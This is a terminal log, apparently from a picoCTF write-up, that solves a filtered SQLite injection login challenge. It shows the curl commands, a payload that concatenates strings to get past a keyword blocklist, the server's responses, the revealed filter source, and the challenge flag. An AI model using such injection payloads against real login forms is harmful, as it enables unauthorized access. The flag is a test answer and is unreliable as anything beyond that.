```
Project/picoCTF/writeup  main ✗                                                                                                                                                                    1d0h ◒  
▶ curl -c cookie -XPOST http://mercury.picoctf.net:26215/index.php -d "user=ad'||'min' group by" -d "pass='"
SELECT username, password FROM users WHERE username='ad'||'min' group by' AND password='''<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Filtered SQLite Injection Challenge #2</h5>
							<h6 class="text-center" style="color:green">Congrats! You won! Check out filter.php</h6>							<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>

Project/picoCTF/writeup  main ✗                                                                                                                                                                    1d0h ◒  
▶ curl -b cookie -XPOST http://mercury.picoctf.net:26215/filter.php                                         
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />session_start</span><span style="color: #007700">();<br /><br />if&nbsp;(!isset(</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner2"</span><span style="color: #007700">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner2"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner2"</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$view&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">"PHP_SELF"</span><span style="color: #007700">]&nbsp;==&nbsp;</span><span style="color: #DD0000">"/filter.php"</span><span style="color: #007700">);<br /><br />if&nbsp;(</span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$filter&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"or"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"and"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"true"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"false"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"union"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"like"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"="</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"&gt;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"&lt;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">";"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"--"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"/*"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"*/"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"admin"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">$view</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Filters:&nbsp;"</span><span style="color: #007700">.</span><span style="color: #0000BB">implode</span><span style="color: #007700">(</span><span style="color: #DD0000">"&nbsp;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$filter</span><span style="color: #007700">).</span><span style="color: #DD0000">"&lt;br/&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}&nbsp;else&nbsp;if&nbsp;(</span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">$view</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #DD0000">"filter.php"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner2"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;&lt;-&nbsp;Don't&nbsp;refresh!<br /></span><span style="color: #007700">}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner2"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;picoCTF{0n3_m0r3_t1m3_fc0f841ee8e0d3e1f479f1a01a617ebb}<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
</code>%                                                                                                                                                                                                    
```
